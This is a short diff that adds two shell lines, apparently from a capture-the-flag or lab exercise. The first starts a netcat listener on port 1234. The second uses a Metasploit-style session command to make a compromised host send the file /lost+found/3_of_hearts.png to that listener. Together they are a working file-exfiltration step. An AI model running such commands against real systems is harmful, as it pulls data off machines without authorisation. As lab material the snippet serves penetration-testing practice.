@@ -1,0 +1,3 @@
+nc -l -p 1234 > 3_of_hearts.png &
+sessions -i $SESSION -c 'nc $HOST_IP 1234 < /lost+found/3_of_hearts.png'
+
